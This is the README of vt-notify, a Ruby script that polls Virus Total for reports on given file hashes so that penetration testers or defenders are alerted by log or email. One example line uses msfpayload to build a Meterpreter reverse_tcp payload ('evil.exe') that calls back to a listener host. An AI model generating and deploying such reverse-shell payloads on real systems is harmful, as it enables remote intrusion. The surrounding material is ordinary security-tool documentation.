
Virus Total Notifier
=========

This project was originally created to notify the user when Virus Total had a report for a specific binary (i.e. one used in a penetration test or otherwise) the penetration tester could be notified via log or email. It runs in an infinite loop and does not check files or hashes that have already been detected by the program; It does, however, continue to re-check hashes that haven't been detected.

This program can also be used as a detection mechanism. Target it towards your web-root or other sensitive directory and it will notify you when anything that has a report on Virus Total is added to your directory.

The script doesn't have anything OS specific in it, so it should be portable anywhere Ruby is installed.


Usage
========

```
Usage: vt-notify [options]
    -e EMAIL // email address of who to notify upon detection, will only log to file if not specified
    -m SMTPSERVER // smtp server to relay email through
    -s FILENAME // file name of binary to keep track of
    -S SHA1 // single SHA1 to keep track of
    -f FILENAME // file containing sha1 hashes of files to keep track of
    -d DIRECTORY // directory of binaries keep track of
    -a APIKEYFILENAME // file contianing API key hash on first line, defaults to apikey.txt
    -l LOGFILENAME // file to write/read positive entries to/from, defaults to results.log
    -i INTERVAL // how often VT is checked, defaults to every 10 minutes
    -h // this help screen
```

For example, the following takes all 500+ files in the hackarmoury repository, SHA1 hashes them and checks them against Virus Total. The ones that have been submitted (even those that have a 0 detection rate) are reported via email to justanotheruser@gmail.com via the Gmail email servers. 
```
./vt-notify.rb -d /opt/hackarmoury/ -e justanotheruser@gmail.com -m gmail-smtp-in.l.google.com
```

Another example is taking a freshly generated 'evil.exe' from Metasploit:
```
./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.100 X > evil.exe
```
And setting up vt-notify to just check on it, with the notifications going to the same gmail account, checking every 20 seconds:
```
./vt-notify.rb -s evil.exe -e justanotheruser@gmail.com -m gmail-smtp-in.l.google.com -i 20
```
Then, acting as the incident responder, I upload the "found" malware to Virus Total and almost instantly:
```
======================================
            RESULTS                   
======================================
Checked:     1
Not found:   1
Found:       0

check complete, sleeping for 20 seconds
4f4c103911eff1668199ff7fbce5e87rae1hee0d was found 35 out of 46 on 2012-12-28 08:29:59
======================================
            RESULTS                   
======================================
Checked:     1
Not found:   0
Found:       1
```
Hash lists are also supported in hash-per-line files (-f) and single SHA1 (-S), however I don't have the ability to support multiple singles on the command line (-S) or (-s)

### Credits
Credit to [@mubix](https://github.com/mubix) for the original vt-notify script  
Credit to [@ashtinblanchard](https://github.com/AshtinBlanchard) for bringing it forward
